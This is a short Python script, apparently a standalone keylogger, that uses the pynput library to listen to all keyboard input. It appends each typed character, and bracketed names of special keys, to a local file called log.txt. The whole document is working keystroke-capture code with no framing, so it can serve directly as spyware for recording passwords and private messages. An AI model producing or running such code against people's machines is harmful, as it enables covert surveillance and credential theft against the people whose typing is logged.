from pynput import keyboard

def on_press(key):
    try:
        with open("log.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        with open("log.txt", "a") as log_file:
            log_file.write(f"[{key}]\n")  # Logs special keys

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
